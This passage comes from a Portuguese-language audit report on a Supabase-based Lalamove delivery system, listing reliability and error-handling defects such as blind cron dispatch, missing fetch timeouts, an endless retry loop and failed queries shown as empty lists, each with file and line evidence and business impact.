- **Arquivos:** `src/pages/RolesPage.tsx`
- **Etapas do plano:** 285


## Causa raiz: Trabalho disparado às cegas: ninguém lê o resultado, nada tem prazo e nada reserva a tarefa

O padrão em todo o sistema é mandar e seguir adiante. As rotinas automáticas do banco disparam as funções e nunca leem a resposta — ficam marcadas como bem-sucedidas mesmo quando a chamada foi recusada. As chamadas a serviços de fora não têm prazo máximo, então um fornecedor lento trava a execução inteira; o erro do Bitrix24 vem embrulhado numa resposta de sucesso e é contado como sucesso; o aumento de taxa é gravado no banco sem conferir se a Lalamove aceitou. Na fila de tarefas, uma tarefa travada volta para o início sem contar a tentativa (repetindo para sempre), o produtor cria mais trabalho do que o consumidor dá conta e duas execuções podem pegar a mesma linha.

**9 achado(s) sob esta causa.**


#### A-023 — Job travado volta para PENDING sem incrementar attempts — laço infinito de redispatch, sem limite de tentativas

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Uma notificação que não consegue ser entregue fica sendo reenviada a cada ~10 minutos para sempre, consumindo invocações pagas da edge function indefinidamente, e nunca aparece como "falhou" em nenhuma tela — a promessa de "retry automático até 3 tentativas" (docs/JOB_QUEUE_SYSTEM.md:36) não vale nesse caminho.
- **Evidência:**
  ```
  supabase/migrations/20261123160000_job_queue_processing_log.sql:85-97 (idem 20261122140000_fix_crons_dispatcher.sql:47-59) → `UPDATE job_queue SET status = CASE WHEN attempts >= max_attempts THEN 'FAILED' ELSE 'PENDING' END, next_retry_at = now(), ... WHERE status = 'PROCESSING' AND started_at < now() - interval '10 minutes'` — nenhuma coluna `attempts` é alterada. Quem marca o job como PROCESSING também não conta tentativa: supabase/migrations/20261122120200_job_queue_system.sql:109-110 → `UPDATE job_queue SET status='PROCESSING', started_at=now(), updated_at=now() WHERE id=p_job_id AND status='PENDING'`. `attempts` só cresce em mark_job_failed (20261122120200:130 → `v_job.attempts := v_job.attempts + 1;`), que é chamado pela edge job-worker — ou seja, só quando a edge chega a rodar.
  ```
- **Causa raiz:** O requeue de PROCESSING travado foi escrito como se `attempts` já tivesse sido incrementado no dispatch. Como o incremento depende do worker responder, todo job cujo HTTP nunca chega ao worker (401, edge fora do ar, timeout, chave do vault ausente) fica com attempts=0 para sempre e a condição de corte `attempts >= max_attempts` nunca é satisfeita.
- **Arquivos:** `supabase/migrations/20261123160000_job_queue_processing_log.sql`, `supabase/migrations/20261122140000_fix_crons_dispatcher.sql`, `supabase/migrations/20261122120200_job_queue_system.sql`, `docs/JOB_QUEUE_SYSTEM.md`
- **Etapas do plano:** 061

#### A-035 — `priority-fee` grava a taxa e o histórico sem checar se a Lalamove aceitou

- **Camada:** Integrações e contratos
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A tela mostra uma gorjeta de prioridade que a Lalamove nunca cobrou nem repassou ao motorista, e o histórico de auditoria registra um aumento que não ocorreu. Pior: por causa da regra de "só pode aumentar", um valor fantasma de R$ 20 impede o operador de oferecer R$ 15 de verdade para desencalhar a entrega.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:991-1014 (persistência sem checar result.error); contraste em :913-914 (cancel) e :1060 (change-driver); regra monotônica em :972-978
  ```
- **Causa raiz:** A única condição antes de persistir é `current?.id` (o pedido existir no banco local). `result.error`/`result.status` nunca são consultados, ao contrário dos cases vizinhos `cancel` (:898 `if (!result.error)`) e `change-driver` (:1055 `if (!result.error)`). Quando a Lalamove recusa o aumento (pedido já concluído, fee menor que o atual do lado dela, 4xx de validação), o banco local passa a afirmar um valor que não existe no pedido real — e a validação de aumento monotônico de :980-986 usa justamente `lalamove_orders.priority_fee` como base, então a linha errada bloqueia tentativas legítimas seguintes.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts`
- **Etapas do plano:** 073

#### A-060 — Os quatro crons que chamam edge functions são disparo cego: nada lê a resposta HTTP e o pg_cron marca 'succeeded' mesmo com 401

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Alertas de motorista, escalonamento, renovação de token da Lalamove e a fila inteira podem estar parados por horas com todos os indicadores verdes — foi exatamente o que aconteceu em 21/11, quando a chave expirada derrubou dois crons às 12:40 e ninguém viu até às 18:40.
- **Evidência:**
  ```
  supabase/migrations/20261122140000_fix_crons_dispatcher.sql:7-9, :71-85, :111-121, :126-135; supabase/migrations/20261123190000_cron_check_driver_alerts.sql:43-52; supabase/migrations/20261123160000_job_queue_processing_log.sql:129-138 (grava succeeded = v_processed, isto e, despacho = sucesso); supabase/migrations/20260711194632_e6def1eb-1b3c-487f-978f-b0774a8201af.sql:39-50 (health le so cron.job_run_details)
  ```
- **Causa raiz:** pg_net é assíncrono: `net.http_post` devolve um id e enfileira; o status real só existe em `net._http_response`. Nenhuma das migrations persiste o request_id nem há rotina que faça o join depois, então toda falha de autenticação, 5xx ou timeout das edges chamadas por cron é invisível, inclusive no painel System Health.
- **Arquivos:** `supabase/migrations/20261122140000_fix_crons_dispatcher.sql`, `supabase/migrations/20261123190000_cron_check_driver_alerts.sql`, `supabase/migrations/20260711194632_e6def1eb-1b3c-487f-978f-b0774a8201af.sql`
- **Etapas do plano:** 170

#### M-079 — lalamove-api e lalamove-uapi chamam a Lalamove sem nenhum timeout, com ate 3 tentativas por chamada

- **Camada:** Backend — edges Lalamove
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Se a Lalamove ficar lenta em vez de cair, a tela de cotacao/pedido fica girando ate estourar e o operador nao recebe nem erro nem resultado — e cada tentativa dessas segura um processo do servidor, o que degrada o sistema inteiro justamente no momento de pico.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:179 e :195-199 (fetch sem signal no laco de 3 tentativas) · supabase/functions/lalamove-uapi/index.ts:180 e :214 · padrao de referencia: supabase/functions/lalamove-gateway/index.ts:43 e :308-324, supabase/functions/_shared/channels/zapp.ts:240-242
  ```
- **Causa raiz:** As duas funcoes mais antigas (std@0.168.0) foram escritas antes do padrao de deadline adotado no gateway e nunca foram alinhadas. Sem `signal`, um upstream que aceita a conexao e nao responde prende a requisicao ate o limite de execucao da plataforma; com retry, o pior caso e multiplicado pelo numero de tentativas. No lalamove-api isso ainda alcanca `fetch-orders-bulk`, que faz ate 50 chamadas em serie (:858-868).
- **Arquivos:** `supabase/functions/lalamove-api/index.ts`, `supabase/functions/lalamove-uapi/index.ts`
- **Etapas do plano:** 172

#### M-080 — Canais Resend, Slack, Bitrix24, n8n e Evolution fazem fetch sem timeout, em laço sequencial

- **Camada:** Backend — notificação e fila
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Se um dos provedores (e-mail, Slack, Bitrix24, n8n) ficar lento, o alerta não sai por nenhum dos outros canais: a função é cortada no meio e os destinatários seguintes nunca são chamados. Uma lentidão em canal secundário derruba o aviso principal.
- **Evidência:**
  ```
  supabase/functions/send-notification/index.ts:1289 `const response = await fetch("https://api.resend.com/emails", {`, :1360 `const response = await fetch(url, {`, :1419-1420 `const response = await fetch(` + `https://${token.domain}/rest/tasks.task.add?auth=${token.access_token}`, :1450 `const response = await fetch(webhookUrl, {`, :1169/:1180 Evolution (só sem Zapp, por :1123/:1151) — nenhum com `signal`; padrão correto em supabase/functions/_shared/channels/sms.ts:116-117
  ```
- **Causa raiz:** O timeout foi implementado só nos canais novos (Zapp e SMS, com `DEFAULT_TIMEOUT_MS`). Os cinco canais antigos usam `fetch` nu. Como `dispatch` é chamado com `await` dentro dos laços de destinatário (index.ts:685-729 e 769-967), um provedor pendurado trava a fila inteira até o limite de execução da edge function.
- **Arquivos:** `supabase/functions/send-notification/index.ts`
- **Etapas do plano:** 173

#### M-088 — Nenhuma chamada a terceiro tem timeout: 9 arquivos de integração usam `fetch` sem `AbortController`

- **Camada:** Integrações e contratos
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Se a Lalamove, o Mapbox, o Google ou o WhatsApp travarem sem derrubar a conexão, a tela fica rodando até o limite da plataforma em vez de falhar rápido e tentar o outro caminho. No geo-gateway isso também impede o failover para o provedor alternativo, porque ele só dispara quando a primeira chamada falha.
- **Evidência:**
  ```
  Sem `signal` em: lalamove-api/index.ts:195,1156 · lalamove-uapi/index.ts:180,214 · send-notification/index.ts:1169,1180,1289,1360,1419,1450 · bitrix24-sync/index.ts:101,152,197,243,255,333 · bitrix24-process-queue/index.ts:108,188,205 · route-analyzer/index.ts:167 · geo-admin/index.ts:54,152,212 · geo-gateway/providers/mapbox.ts:100,104,466 · geo-gateway/providers/google.ts:121,259,358,377. Referencias corretas: check-external-api/index.ts:133 e _shared/channels/zapp.ts:240-242
  ```
- **Causa raiz:** O repo tem o padrão certo em quatro lugares — `lalamove-gateway/index.ts:305-307` (`AbortController` + `TIMEOUT_MS = 25_000`), `lalamove-token-refresh/index.ts:160-161`, `_shared/channels/zapp.ts:233-234` e `_shared/channels/sms.ts:116-117` — mas ele nunca foi aplicado às chamadas que falam com o terceiro de verdade. Sem `signal`, um provedor que aceita a conexão e não responde prende a invocação até o limite de parede da plataforma, consumindo o tempo de execução e, em `lalamove-api`, multiplicando pelo retry (até 3 tentativas penduradas na mesma invocação).
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts`, `/home/user/Lalamove_V2/supabase/functions/lalamove-uapi/index.ts`, `/home/user/Lalamove_V2/supabase/functions/geo-gateway/providers/mapbox.ts`, `/home/user/Lalamove_V2/supabase/functions/geo-gateway/providers/google.ts`, `/home/user/Lalamove_V2/supabase/functions/send-notification/index.ts`, `/home/user/Lalamove_V2/supabase/functions/bitrix24-sync/index.ts`, `/home/user/Lalamove_V2/supabase/functions/bitrix24-process-queue/index.ts`, `/home/user/Lalamove_V2/supabase/functions/route-analyzer/index.ts`, `/home/user/Lalamove_V2/supabase/functions/geo-admin/index.ts`
- **Etapas do plano:** 183

#### M-103 — refresh_geo_jobs enfileira 1 a 2 jobs por rastreio ativo a cada 5 min contra um dispatcher de 10 jobs por minuto

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Acima de algumas dezenas de entregas simultâneas a fila passa a acumular: o ETA e a rota mostrados ao cliente ficam cada vez mais atrasados e as notificações de geofence entram em espera atrás deles, sem nenhum erro aparecer.
- **Evidência:**
  ```
  O produtor não tem teto: supabase/migrations/20261121194500_geo_jobs_scheduler.sql:32-49 percorre todo tracking ativo (`FOR r IN SELECT t.id FROM active_tracking t WHERE t.tracking_status = 'ACTIVE' AND ...`) e chama `add_job(p_type => 'eta_refresh', ...)` para cada um, e o segundo laço (:52-75) repete para `route_plan`; o cron roda a cada 5 min (:88 → `SELECT cron.schedule('geo-jobs-refresh', '1-59/5 * * * *', $$SELECT public.refresh_geo_jobs();$$);`). O consumidor é fixo: supabase/migrations/20261122140000_fix_crons_dispatcher.sql:104-105 → `PERFORM cron.schedule('process-job-queue', '* * * * *', 'select public.process_job_queue(10);')`, com o limite chegando em `get_next_jobs(p_limit)` (20261122120200_job_queue_system.sql:102 → `LIMIT p_limit FOR UPDATE SKIP LOCKED`). Teto de vazão: 50 jobs por janela de 5 min contra um piso de 1 job por rastreio ativo na mesma janela, mais os jobs de notificação que dividem a mesma fila.
  ```
- **Causa raiz:** Produtor e consumidor foram dimensionados em migrations diferentes e nunca foram confrontados: o `p_limit` de 10 veio do desenho original da fila de notificações, antes de os jobs geo (eta_refresh/route_plan) passarem a usar a mesma fila.
- **Arquivos:** `supabase/migrations/20261121194500_geo_jobs_scheduler.sql`, `supabase/migrations/20261122140000_fix_crons_dispatcher.sql`, `supabase/migrations/20261122120200_job_queue_system.sql`
- **Etapas do plano:** 219
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Volume real de rastreios ativos simultâneos e profundidade atual da fila, que exigem leitura do banco oficial: `select count(*) from active_tracking where tracking_status='ACTIVE'` e `select status, count(*), min(created_at) from job_queue group by 1`.

#### M-120 — Erro do Bitrix24 chega em corpo HTTP 200 e é contado como sucesso em três pontos

- **Camada:** Integrações e contratos
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A operação vê "sincronizado" e "tarefa criada" quando o Bitrix24 recusou. Alerta crítico que deveria abrir tarefa para o responsável não abre e ninguém é avisado; o contador de erros da fila fica em zero enquanto as linhas estão marcadas como erro no banco.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/send-notification/index.ts:1428-1433 → `if (!response.ok) { throw new Error("Bitrix24 error: ${response.statusText}"); }` / `logger.log("[Bitrix24] Task created");` / `return { success: true };`  ·  /home/user/Lalamove_V2/supabase/functions/bitrix24-sync/index.ts:296-297 → `success: true,` / `deal_updated: updateResult.result,`  ·  /home/user/Lalamove_V2/supabase/functions/bitrix24-process-queue/index.ts:231 e :250 → `sync_status: updateResult.result ? "success" : "error",` ... `processed++;`
  ```
- **Causa raiz:** A REST do Bitrix24 devolve HTTP 200 com `{error, error_description}` para erro de negócio (token vencido, usuário inexistente, deal inexistente). O repo sabe disso — `bitrix24-sync/index.ts:281` e `bitrix24-process-queue/index.ts:232-233` leem `updateResult.result`/`updateResult.error_description` para gravar `sync_status`. Mas o resultado exposto ao chamador ignora essa leitura: `send-notification` só olha `response.ok` e nunca faz parse do corpo, devolvendo `success: true` para tarefa não criada; `bitrix24-sync` devolve `success: true` com `deal_updated: undefined`; e `bitrix24-process-queue` incrementa `processed` mesmo quando acabou de gravar `sync_status: "error"`, então o relatório final `{processed, errors}` conta a falha como processada.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/send-notification/index.ts`, `/home/user/Lalamove_V2/supabase/functions/bitrix24-sync/index.ts`, `/home/user/Lalamove_V2/supabase/functions/bitrix24-process-queue/index.ts`
- **Etapas do plano:** 244

#### B-017 — bitrix24-process-queue processa a fila sem reservar a linha e sem serializar o refresh de token

- **Camada:** Backend — notificação e fila
- **Severidade:** Baixa · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O mesmo negócio no CRM é atualizado duas vezes e ganha duas atividades iguais no histórico, poluindo o registro do cliente. Pior: duas renovações de credencial ao mesmo tempo podem invalidar a conexão com o Bitrix24 e parar a sincronização até alguém reconectar à mão.
- **Evidência:**
  ```
  supabase/functions/bitrix24-process-queue/index.ts:45-49 `.from("bitrix24_sync").select("*, lalamove_orders(*, drivers(*))").eq("sync_status", "pending").limit(10);` (sem claim; status só muda em :229-237) + o único disparo é manual: src/pages/Bitrix24Page.tsx:24 `const { data, error } = await supabase.functions.invoke("bitrix24-process-queue");` — nenhuma migration agenda esta edge.
  ```
- **Causa raiz:** A fila é lida e processada sem reserva (claim) nem lease: o status só muda no fim (:229-237). Duas execuções sobrepostas — cron de 1 min com um ciclo que passa de 1 min, ou invocação manual junto do cron — leem as mesmas 10 linhas. O refresh de OAuth também não é serializado: dois refreshes concorrentes com o mesmo `refresh_token` fazem o Bitrix24 invalidar um deles. O padrão correto já existe no repo: `mark_job_processing` em supabase/migrations/20261122120200_job_queue_system.sql:105-112 e o requeue de PROCESSING travado >10 min em 20261122140000_fix_crons_dispatcher.sql:47-59.
- **Arquivos:** `supabase/functions/bitrix24-process-queue/index.ts`
- **Etapas do plano:** 199
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Leitura de `bitrix24_activities` na produção (duplicatas por `deal_id`+`subject`+minuto) e a periodicidade real do cron desta função — nenhum MCP desta sessão aponta para o projeto oficial.


## Causa raiz: Falha de consulta exibida como "não tem nada", e erro do servidor em formato que a tela não lê

A interface foi escrita tratando só dois casos: carregando e carregou. Quando a consulta falha — rede, permissão negada, sessão vencida — o código cai no caminho de lista vazia, no número zero ou no spinner eterno, e o operador conclui que não há registros. O mesmo vale para o avesso: ausência de atividade é lida como defeito e a saúde geral aparece como degradada sem nenhum incidente, e a nota de desempenho mostra zero quando ainda não houve medição. No sentido inverso, cada função de servidor devolve o erro num formato próprio e a tela só sabe ler um deles, então a mensagem certa nunca chega ao usuário — às vezes chega o texto interno da exceção.

**8 achado(s) sob esta causa.**


#### A-039 — Falha do get-mapbox-token deixa o mapa ao vivo travado no spinner, sem mensagem e sem retry

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Se a sessão do operador expira ou o token do mapa sai do ar, a tela de rastreamento ao vivo fica girando para sempre sem dizer o que houve — o operador acha que não há entregas em andamento e ninguém descobre o motivo.
- **Evidência:**
  ```
  src/components/map/hooks/useMapboxToken.ts:15-18 `if (error) {` / `  // Silently fail - mapbox is optional` / `  return;` · LiveMap.tsx:74 `const [loading, setLoading] = useState(true);` · LiveMap.tsx:177 `setLoading(false);` (só no evento 'load') · LiveMap.tsx:562 `{loading && !isGoogleActive && (`
  ```
- **Causa raiz:** Quando `supabase.functions.invoke('get-mapbox-token')` devolve `error` (JWT expirado → 401, ou MAPBOX_ACCESS_TOKEN ausente → 500, ver supabase/functions/get-mapbox-token/index.ts:37-46 e supabase/config.toml:6-7 `verify_jwt = true`), o hook retorna sem setar `error` e sem setar token. O LiveMap só mostra tela de erro quando `error` é string (LiveMap.tsx:393) e o `loading` nunca vira false porque o evento 'load' do Mapbox nunca acontece. Resultado: `error === null` e `mapboxToken === null` = spinner infinito. O hook não tenta novamente (useEffect com `[]`).
- **Arquivos:** `src/components/map/hooks/useMapboxToken.ts`, `src/components/map/LiveMap.tsx`, `src/components/map/hooks/__tests__/useMapboxToken.test.ts`
- **Etapas do plano:** 078

#### M-028 — Cada uma das cinco funcoes responde erro num formato diferente, e so um deles o front sabe ler

- **Camada:** Backend — edges Lalamove
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O operador recebe 'erro ao processar' em vez do motivo real (telefone fora do padrao, taxa menor que a atual, pedido ja cancelado), mesmo quando a edge sabe exatamente o que houve. Isso vira chamado de suporte e retrabalho em cima de informacao que ja existia.
- **Evidência:**
  ```
  Formatos: _shared/contract.ts:187-203; lalamove-api/index.ts:138-144 e :819-822; lalamove-gateway/index.ts:210-219 (chamado em :233/:285/:337/:406); lalamove-uapi/index.ts:805-807. Leitor único: src/lib/edge-error.ts:33-35. Ressalva: o caminho 2xx já é lido em src/lib/lalamove-api.ts:84-86 e src/hooks/useLalamoveUapi.ts:49-55; a perda de mensagem ocorre só nos status não-2xx (src/components/orders/NewOrderDialog.tsx:330).
  ```
- **Causa raiz:** A camada de contrato foi adicionada depois e so cobre o caminho de validacao (422). Os erros de regra de negocio, de upstream e de excecao de cada funcao continuaram no formato que cada uma tinha. Como `parseEdgeError` devolve null para `error` do tipo string, todo erro que nao seja 422 de schema cai no texto generico de fallback da tela.
- **Arquivos:** `supabase/functions/lalamove-api/index.ts`, `supabase/functions/lalamove-gateway/index.ts`, `supabase/functions/lalamove-uapi/index.ts`, `supabase/functions/_shared/contract.ts`, `src/lib/edge-error.ts`
- **Etapas do plano:** 107

#### M-066 — Falhas de consulta engolidas: contadores da sidebar e contagem de incidentes viram zero sem avisar

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O operador vê o menu sem nenhuma aprovação pendente, nenhum alerta e nenhum incidente aberto, e a lista de motoristas com zero ocorrências, quando na verdade a consulta falhou. Trabalho crítico deixa de ser feito por parecer que não existe.
- **Evidência:**
  ```
  src/hooks/useSidebarCounts.ts:15-20 `const { count } = await supabase.from('alerts').select('*', { count: 'exact', head: true }).eq('is_read', false).eq('is_dismissed', false); return count ?? 0;` (idem :24-28 e :32-36); src/hooks/useDrivers.ts:53-54 `if (incidentError) { logger.error('Error fetching incidents:', incidentError); }`; src/hooks/useDrivers.ts:85 `incidentCount: incidentMap.get(driver.id) || 0`; src/integrations/supabase/client.ts:12 `export const supabase = createClient<Database>(...)` (sem throwOnError)
  ```
- **Causa raiz:** As três funções de contagem desestruturam só `count` e ignoram `error`; qualquer falha (RLS, rede, timeout) deixa `count` indefinido e o hook publica 0 como dado real. Em useDrivers, a falha ao buscar incidentes é apenas logada e a execução continua, atribuindo 0 incidentes a todos os motoristas — indistinguível de frota sem ocorrência.
- **Arquivos:** `src/hooks/useSidebarCounts.ts`, `src/hooks/useDrivers.ts`
- **Etapas do plano:** 148

#### M-075 — Consulta que falha aparece como 'nenhum registro' em tres blocos do detalhe do pedido

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Quando a consulta falha (politica de acesso, rede, coluna renomeada) a tela afirma que nao existe prova de entrega, nem codigo de entrega, nem historico de status do pedido. O operador decide com base numa ausencia que e falsa — inclusive em disputa de entrega, onde a foto existe.
- **Evidência:**
  ```
  src/components/orders/OrderDetailModal.tsx:477-489 (erro do PostgREST engolido) e :867-873 (bloco de erro inalcançável); src/components/orders/OrderGeoEvents.tsx:66 e :124-135; src/components/orders/StatusTimeline.tsx:40 e :79-81
  ```
- **Causa raiz:** Nos tres casos o estado de erro nao chega a tela: no primeiro a queryFn engole o erro do PostgREST (entao `isError` nunca fica true e a mensagem de falha ja escrita em :867-873 nunca renderiza); nos outros dois a queryFn lanca certo, mas o componente so desestrutura `data`/`isLoading` e trata qualquer ausencia como lista vazia.
- **Arquivos:** `src/components/orders/OrderDetailModal.tsx`, `src/components/orders/OrderGeoEvents.tsx`, `src/components/orders/StatusTimeline.tsx`
- **Etapas do plano:** 157

#### M-097 — Falha ao carregar lista vira estado vazio em três telas de segurança e aprovação

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Se a consulta falhar, o administrador lê 'Nenhum país na whitelist' ou 'Nenhum IP na whitelist' e pode concluir que alguém apagou as regras de acesso, ou que não há pedido de reset de senha para aprovar, quando na verdade a tela só não conseguiu carregar.
- **Evidência:**
  ```
  src/pages/GeoBlockingPage.tsx:93 `const { data: allowedCountries = [], isLoading } = useQuery({` com vazio em :333-335 (o auditor citou :344-346, deslocado ~11 linhas); src/pages/PasswordResetApprovalsPage.tsx:27 com vazio em :136; src/pages/IPWhitelistPage.tsx:41 com vazio em :160. Ausência de rede de segurança global: src/App.tsx:89-95 `defaultOptions: { queries: { staleTime: 10000, gcTime: 5*60*1000, refetchOnWindowFocus: false, retry: 1 } }`.
  ```
- **Causa raiz:** As três páginas tratam apenas `isLoading` e caem no ramo de lista vazia quando a query falha (erro de rede, RLS negando, token expirado). O repo tem o padrão correto em outras telas do mesmo escopo — WebhooksPage.tsx:120-131 e RiskRulesPage.tsx:155-165 renderizam um bloco de erro dedicado.
- **Arquivos:** `src/pages/GeoBlockingPage.tsx`, `src/pages/PasswordResetApprovalsPage.tsx`, `src/pages/IPWhitelistPage.tsx`
- **Etapas do plano:** 192

#### M-130 — Saúde geral cai para "degradado" sem incidente: sistema ocioso e ausência de canais realtime são tratados como falha

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Toda madrugada, feriado ou período sem pedidos o painel acusa sistema degradado. O dono aprende a ignorar o alerta e perde o sinal quando a degradação for verdadeira.
- **Evidência:**
  ```
  src/hooks/healthChecks.ts:85-92 `const fiveMinutesAgo = new Date(now.getTime() - 5 * 60 * 1000); ... if (lastUpdate < fiveMinutesAgo) { status = 'degraded'; message = 'Dados podem estar desatualizados'; }`; src/hooks/healthChecks.ts:153 `if (statuses.includes('degraded')) return 'degraded';`; protecão não vista pelo auditor: src/components/layout/Sidebar.tsx:36 `useSidebarCountsRealtime(refetchCounts);` + src/hooks/useRealtimeSubscriptions.ts:381-382 `const channel = supabase.channel('sidebar-counts-consolidated')`
  ```
- **Causa raiz:** Dois checks confundem "sem atividade" com "com defeito": o de realtime mede canais abertos pela própria aba (a página de saúde não assina nada) e o de cache marca degradado se nenhum pedido foi atualizado nos últimos 5 minutos. Qualquer um dos dois arrasta o status geral para "Partial Degradation".
- **Arquivos:** `src/hooks/healthChecks.ts`, `src/hooks/useSystemHealth.ts`, `src/pages/SystemHealthExpandedPage.tsx`, `src/pages/SystemHealthPage.tsx`
- **Etapas do plano:** 254

#### M-131 — Score de Performance mostra 0/100 "Ruim" quando ainda não há métricas e normaliza o resultado pelo que foi coletado

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Ao abrir a página, o medidor mostra 0/100 em vermelho e "Ruim" como se o site estivesse péssimo; segundos depois pode pular para 100 "Excelente" com uma métrica só. O indicador não serve nem para alarmar nem para tranquilizar.
- **Evidência:**
  ```
  src/utils/webVitals.ts:207-217; src/pages/PerformanceDashboardPage.tsx:152,185-196,262,402
  ```
- **Causa raiz:** Sem nenhuma métrica, a função devolve 0 e a UI não distingue "sem dados" de "nota zero"; com coleta parcial (INP, por exemplo, só é reportado após interação), o score é normalizado pelo peso do que chegou — uma única métrica boa resulta em "Excelente".
- **Arquivos:** `src/utils/webVitals.ts`, `src/pages/PerformanceDashboardPage.tsx`
- **Etapas do plano:** 255

#### B-042 — Erro cru da Lalamove e mensagem interna de excecao voltam para o cliente

- **Camada:** Backend — edges Lalamove
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Detalhe interno da integracao aparece na tela ou no console do navegador de qualquer pessoa logada — util para quem quer mapear o sistema. E o operador recebe texto tecnico em ingles no lugar de uma mensagem que diga o que fazer, o que gera chamado em vez de acao.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:219-231 e :1200-1206 · supabase/functions/lalamove-gateway/index.ts:394-399 e :404-406 · contraponto: supabase/config.toml:16-19 e :88-91 (verify_jwt=true) e src/lib/orderErrors.ts:30-45 (o front parseia o detalhe cru de proposito)
  ```
- **Causa raiz:** Nenhuma das duas funcoes tem uma fronteira entre 'erro do terceiro/erro interno' e 'erro do cliente'. O lalamove-api repassa `responseText` quando o corpo nao segue o formato `{errors:[...]}` esperado — o que inclui pagina de WAF, HTML de erro e qualquer texto do upstream. O gateway devolve `err.message` de qualquer excecao nao prevista, que pode carregar nome de variavel de ambiente ausente, URL interna ou detalhe de driver de banco. Note que as duas funcoes ja sabem fazer o certo em outro ponto: lalamove-api/index.ts:1208-1213 e lalamove-uapi/index.ts:810-815 respondem 'Internal server error' generico no catch final.
- **Arquivos:** `supabase/functions/lalamove-api/index.ts`, `supabase/functions/lalamove-gateway/index.ts`
- **Etapas do plano:** 262


## Causa raiz: Funcionalidade construída, às vezes testada, e nunca ligada a nenhum chamador

Várias peças foram concluídas e deixadas sem o último passo: não existe quem as chame, nem agendamento, nem entrada no menu. A regra que impediria pedido de voltar a um estado anterior está escrita e com teste verde, mas o único ponto que muda status não a usa. A fila do Bitrix24 enche e só esvazia se alguém clicar num botão. As rotinas de limpeza de registros antigos nunca foram agendadas, então os logs crescem sem corte. Os alertas críticos de segurança param numa tabela e ninguém os transforma em notificação. A rotação da credencial do mapa foi construída e implantada, e nunca roda. Há ainda cerca de 1.900 linhas de tela exportadas e nunca usadas.

**8 achado(s) sob esta causa.**


#### M-001 — Alertas críticos de segurança do webhook e de quota da Lalamove param na tabela `alerts`: nada enfileira notificação e o escalonamento nasce desligado

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Uma rejeição de assinatura HMAC no webhook da Lalamove — que indica segredo dessincronizado ou tentativa de forjar pedido — e o esgotamento da cota da API geram apenas uma linha no banco; ninguém recebe WhatsApp, e-mail ou Slack até alguém abrir a tela de alertas.
- **Evidência:**
  ```
